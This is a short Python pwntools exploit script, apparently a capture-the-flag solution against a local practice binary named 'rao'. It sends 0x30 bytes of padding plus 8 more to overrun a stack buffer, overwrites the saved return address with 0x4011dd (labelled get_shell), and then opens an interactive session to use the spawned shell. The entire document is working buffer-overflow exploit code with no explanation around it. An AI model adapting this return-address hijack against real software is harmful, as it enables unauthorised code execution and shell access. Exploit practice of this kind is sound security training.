from pwn import *

r = process("./rao")

context.log_level = 'DEBUG'

r.recvuntil(b"Input: ")

get_shell = 0x4011dd

pay = b"A" * 0x30
pay += b"A" * 0x8
pay += p64(get_shell)

r.sendline(pay)
r.interactive()